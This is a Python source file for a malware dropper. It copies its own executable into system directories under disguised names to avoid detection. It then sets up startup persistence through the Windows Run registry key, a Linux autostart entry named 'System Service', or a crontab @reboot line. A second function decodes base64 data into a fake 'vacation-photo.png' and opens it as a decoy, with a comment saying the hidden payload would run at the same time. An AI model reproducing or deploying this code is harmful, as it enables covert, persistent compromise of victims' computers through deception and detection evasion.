import os, sys, time, subprocess, base64
from pathlib import Path


def makehidden():
    """
    Copies the current executable to a hidden location and sets it up to run at system startup.

    This function performs the following operations:
    1. Copies the running executable to a system directory (ProgramData on Windows, /usr/local/bin on Linux)
    2. On Windows, uses a temporary PNG filename before renaming to EXE to avoid detection
    3. Sets up persistence mechanism:
       - Windows: Adds registry entry in HKCU\\...\\Run
       - Linux: Creates .desktop file in autostart directories or adds @reboot entry to crontab
    4. Launches the copied executable

    Features:
    - Cross-platform support (Windows/Linux)
    - Comprehensive error handling
    - Multiple fallback methods for persistence
    - Cleanup of temporary files if operations fail

    Returns:
        bool: True if all operations completed successfully, False if any step failed

    Side Effects:
        - Creates file in system directory
        - Modifies system startup configuration (registry/crontab)
        - Launches new process

    Security Considerations:
        - On Windows, uses temporary PNG filename to avoid detection
        - On Linux, uses dot-prefixed hidden filenames
        - Sets proper executable permissions on Linux

    Error Handling:
        - Continues operation if non-critical steps fail
        - Cleans up temporary files if operations fail
        - Returns False on any critical failure

    Example:
        >>> success = makehidden()
        >>> if not success:
        ...     print("Failed to set up persistence")
    """
    try:
        time.sleep(1)  # Initial delay

        # Determine target path based on OS
        if sys.platform == "win32":
            target_path = "C:\\ProgramData\\"
            target_file = "s_win32.exe"
            temp_file = "simg.png"
        else:
            target_path = "/usr/local/bin/"
            target_file = ".s_linux"
            temp_file = ".s_img"

        target_file_path = os.path.join(target_path, target_file)
        temp_file_path = os.path.join(target_path, temp_file)

        # Copy executable if it doesn't already exist in target location
        if not os.path.isfile(target_file_path):
            try:
                # Read current executable
                with open(sys.executable, "rb") as src_file:
                    bdata = src_file.read()
                    src_file.close()

                # Write to temporary file
                with open(temp_file_path, "wb") as dest_file:
                    dest_file.write(bdata)
                    dest_file.close()

                # Rename to final filename
                os.chdir(target_path)
                os.rename(temp_file, target_file)

                # Make executable on Linux
                if sys.platform != "win32":
                    os.chmod(target_file_path, 0o755)

            except (IOError, OSError, PermissionError) as e:
                print(f"Error copying executable: {e}")
                try:
                    os.remove(temp_file_path)
                except:
                    pass
                return False

        # Add to startup
        try:
            if sys.platform == "win32":
                # Windows registry method
                result = subprocess.run(
                    f'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v s_win32.exe /t REG_SZ /d "{target_file_path}"',
                    shell=True,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                )
                if result.returncode != 0:
                    print(f"Registry add failed: {result.stderr.decode().strip()}")
            else:
                # Linux autostart method
                autostart_paths = [
                    os.path.expanduser("~/.config/autostart/"),
                    "/etc/xdg/autostart/",
                ]

                desktop_entry = f"""[Desktop Entry]
Type=Application
Exec={target_file_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Service
Comment=System background service
"""

                for path in autostart_paths:
                    try:
                        os.makedirs(path, exist_ok=True)
                        with open(os.path.join(path, ".s_linux.desktop"), "w") as f:
                            f.write(desktop_entry)
                        break
                    except (IOError, PermissionError):
                        continue

                # Alternative crontab method if desktop entry fails
                try:
                    current_cron = subprocess.check_output(
                        ["crontab", "-l"], stderr=subprocess.PIPE
                    ).decode()
                except subprocess.CalledProcessError:
                    current_cron = ""

                if target_file_path not in current_cron:
                    new_cron = f"{current_cron}\n@reboot {target_file_path}\n"
                    subprocess.run(
                        ["crontab", "-"], input=new_cron.encode(), check=True
                    )

        except (subprocess.CalledProcessError, OSError, PermissionError) as e:
            print(f"Error setting up autostart: {e}")
            # Continue even if autostart fails - we can try again later

        # Launch the copied executable
        try:
            subprocess.Popen(target_file_path, shell=False)
            return True
        except (OSError, subprocess.SubprocessError) as e:
            print(f"Error launching executable: {e}")
            return False

    except Exception as e:
        print(f"Unexpected error in makehidden: {e}")
        return False


def extract_encoded(encoded_data):
    try:
        # Determine target path based on OS
        if sys.platform == "win32":
            target_path = "C:\\ProgramData\\"
            fake_image = "vacation-photo.png"
            open_cmd = lambda f: os.startfile(f)
        else:
            target_path = "/tmp/"
            fake_image = ".vacation-photo.png"
            open_cmd = lambda f: subprocess.Popen(
                ["xdg-open", f], stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )

        # Ensure target directory exists
        Path(target_path).mkdir(parents=True, exist_ok=True)

        # Write the "image" file
        image_path = os.path.join(target_path, fake_image)
        with open(image_path, "wb") as fp:
            fp.write(base64.b64decode(encoded_data))
            fp.close()
            
        # For the actual payload execution (hidden from user)
        # This would be your makehidden() function or similar
        # makehidden()

        # "Open" the image file to maintain appearance
        open_cmd(image_path)
        return True

    # Handle errors
    except Exception as e:
        print(f"Error in extract_encoded: {e}")
        return False
